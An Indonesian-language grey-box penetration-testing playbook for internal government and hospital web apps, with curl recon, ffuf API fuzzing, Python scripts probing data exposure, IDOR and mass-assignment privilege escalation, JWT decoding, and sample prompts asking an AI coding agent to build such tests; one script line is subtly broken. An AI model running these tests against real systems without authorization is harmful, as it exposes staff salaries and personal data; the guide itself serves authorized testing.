# Skenario 5: Jaringan Internal (210.57.X.X) — Grey Box

**Akses:** Jaringan internal organisasi / intranet  
**Metode:** Grey Box — punya akun user, sebagian dokumentasi, tahu teknologi stack  
**Contoh target:** `http://210.57.10.25` + akun `pegawai001:pass123`

---

## Informasi Awal yang Tersedia

| Item | Status |
|------|--------|
| URL / IP target | ✓ |
| Akun user (level rendah) | ✓ misal: pegawai / mahasiswa |
| Teknologi stack | ✓ Sebagian (misal: "Laravel + MySQL") |
| Diagram arsitektur | ✓ Sebagian |
| Source code | ✗ |
| Akun admin | ✗ |

---

## Konteks Khas Jaringan Internal Indonesia

Aplikasi pada IP `210.57.x.x` sering berupa:
- **SIMPEG** — Sistem Informasi Kepegawaian
- **SIMRS** — Sistem Informasi Manajemen Rumah Sakit
- **Portal akademik** — SIAK/SIAKAD universitas
- **ERP internal** — sistem keuangan/inventaris
- **Helpdesk/ticketing** internal

---

## Phase 1: Authenticated Reconnaissance

```bash
# Login dan capture session token
curl -c cookies.txt -X POST http://210.57.10.25/login \
  -d "username=pegawai001&password=pass123" \
  -L -o /dev/null -w "%{http_code}"

# Simpan session dan browse
curl -b cookies.txt http://210.57.10.25/dashboard
curl -b cookies.txt http://210.57.10.25/api/v1/profile
curl -b cookies.txt http://210.57.10.25/api/v1/users  # coba akses all users
```

**Prompt Claude Code:**
```
Grey box pentest pada aplikasi internal 210.57.10.25 (kemungkinan SIMPEG).
Saya punya akun: pegawai001 (level: staf biasa)
Stack: Laravel + MySQL (dari header Server dan X-Powered-By)

Buatkan:
1. Checklist endpoint yang harus dicoba sebagai staf
2. Endpoint admin yang harus dicoba untuk privilege escalation
3. Parameter yang rawan IDOR di konteks SIMPEG (ID pegawai, ID jabatan, NIP)
4. Data sensitif yang mungkin bocor ke user biasa di aplikasi HR
```

---

## Phase 2: API Discovery dan Testing

Aplikasi modern sering punya API yang tidak terdokumentasi:

```bash
# Cari dokumentasi API
curl -b cookies.txt http://210.57.10.25/api/
curl -b cookies.txt http://210.57.10.25/api/v1/
curl -b cookies.txt http://210.57.10.25/swagger-ui/
curl -b cookies.txt http://210.57.10.25/api-docs
curl -b cookies.txt http://210.57.10.25/actuator  # Spring Boot

# Fuzz API endpoints
ffuf -u http://210.57.10.25/api/v1/FUZZ \
  -w /usr/share/wordlists/api_wordlist.txt \
  -b "laravel_session=<token>" \
  -mc 200,201,400,403 \
  -o scans/web/api_fuzz.json
```

**Prompt Claude Code:**
```
Laravel app di 210.57.10.25. Saya punya session sebagai user biasa.
Dari Burp sitemap, ditemukan endpoint:
[PASTE LIST API ENDPOINT]

Bantu:
1. Identifikasi endpoint yang mungkin memiliki IDOR (ada {id} atau angka di path?)
2. Test BOLA (Broken Object Level Authorization) — akses resource user lain
3. Test BFLA (Broken Function Level Authorization) — akses fungsi admin
4. Buatkan script Python untuk otomasi test semua endpoint
```

---

## Phase 3: Data Exposure Testing

```python
# vulnerabilities/data_exposure_test.py
import requests
import json

BASE = "http://210.57.10.25"
SESSION = {"laravel_session": "<token>"}

# Test apakah response mengandung data user lain
def test_user_data_exposure():
    endpoints = [
        "/api/v1/users",           # all users list
        "/api/v1/employees",       # all employees
        "/api/v1/salary",          # salary data
        "/api/v1/reports/all",     # all reports
    ]
    
    for ep in endpoints:
        resp = requests.get(BASE + ep, cookies=SESSION)
        data = resp.json() if resp.headers.get('content-type', '').includes('json') else resp.text
        
        if resp.status_code == 200:
            print(f"[!] EXPOSED: {ep} — {resp.status_code}")
            print(f"    Response size: {len(resp.text)} bytes")
            # Cek apakah mengandung data sensitif
            sensitive_keys = ['password', 'salary', 'gaji', 'nik', 'ktp', 'phone']
            for key in sensitive_keys:
                if key in resp.text.lower():
                    print(f"    [SENSITIVE] Mengandung field: {key}")
        else:
            print(f"[ ] {ep} — {resp.status_code}")

test_user_data_exposure()
```

---

## Phase 4: Mass Assignment Testing

Laravel/Framework modern sering rentan mass assignment:

```python
# Test mass assignment — tambahkan field yang tidak seharusnya bisa di-set
def test_mass_assignment():
    # Update profile normal
    normal_data = {"name": "Pegawai Test", "email": "test@org.go.id"}
    
    # Inject field berbahaya
    malicious_data = {
        "name": "Pegawai Test",
        "email": "test@org.go.id",
        "role": "admin",          # coba inject role
        "is_admin": 1,            # flag admin
        "department_id": 1,       # pindah department
        "salary": 99999999,       # ubah gaji
    }
    
    resp = requests.put(
        f"{BASE}/api/v1/profile",
        json=malicious_data,
        cookies=SESSION
    )
    
    # Cek apakah field berbahaya ter-update
    check = requests.get(f"{BASE}/api/v1/profile", cookies=SESSION)
    print(f"Profile setelah update: {check.json()}")
```

**Prompt Claude Code:**
```
Grey box pentest pada aplikasi Laravel internal.
Saya bisa update profile di: PUT /api/v1/profile
Normal fields: name, email, phone

Buatkan comprehensive mass assignment test yang mencoba:
1. Fields role escalation: role, is_admin, user_type, level
2. Fields financial: salary, gaji, allowance
3. Fields identity: department_id, jabatan_id, manager_id  
4. Fields akses: permissions, can_access_report
5. Verifikasi setelah setiap attempt apakah field berubah
```

---

## Phase 5: JWT / Session Token Manipulation

```python
# Decode dan analisis JWT Laravel Sanctum / Passport
import base64
import json
import hmac
import hashlib

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.b64decode(parts[0] + '=='))
    payload = json.loads(base64.b64decode(parts[1] + '=='))
    return header, payload

token = "<TOKEN_DARI_APP>"
header, payload = decode_jwt(token)
print("Header:", json.dumps(header, indent=2))
print("Payload:", json.dumps(payload, indent=2))
# Cek: user_id, role, exp, iss
```

---

## Phase 6: Business Logic Khusus Aplikasi Internal

**Prompt Claude Code:**
```
Aplikasi SIMPEG internal (210.57.10.25). Saya login sebagai staf biasa.
Fitur yang saya lihat: ajukan cuti, lihat slip gaji saya, update profil.

Buatkan business logic test cases:
1. Bisakah saya melihat slip gaji rekan kerja? (IDOR pada /slip-gaji/{id})
2. Bisakah saya approve cuti sendiri? (parameter manipulation)
3. Bisakah saya mengajukan cuti atas nama orang lain?
4. Bisakah saya melihat struktur gaji seluruh organisasi?
5. Apakah ada eksport data (Excel/PDF) yang bisa saya akses tanpa izin?
6. Apakah ada endpoint yang hanya di-filter di frontend tapi tidak di backend?
```

---

## Checklist Grey Box Internal

```
[ ] Login dan verifikasi session
[ ] Map semua endpoint authenticated dengan Burp
[ ] Discover API endpoints tersembunyi (ffuf)
[ ] Test IDOR pada semua resource ID
[ ] Test privilege escalation ke admin/supervisor
[ ] Test mass assignment pada semua PUT/PATCH endpoint
[ ] Test data exposure pada endpoint list
[ ] Test business logic vulnerabilities
[ ] Analisis JWT/session token
[ ] Test file upload jika ada (upload ke direktori berbeda)
[ ] Test injection pada semua input parameter
[ ] Dokumentasikan data sensitif yang terekspos (PII protocol)
```

---

## Catatan Khusus: Penanganan Data Sensitif

Aplikasi internal sering mengandung data PII sensitif. Jika ditemukan:

```
PROTOKOL DATA SENSITIF:
1. Screenshot/dokumentasikan minimum yang diperlukan sebagai bukti
2. Jangan download/simpan data nyata — hanya catat strukturnya
3. Laporkan SEGERA ke klien/pemilik sistem
4. Dalam laporan: sebutkan risiko tanpa mempublikasikan data asli
5. Rekomendasikan enkripsi data at-rest dan masking di API response
```
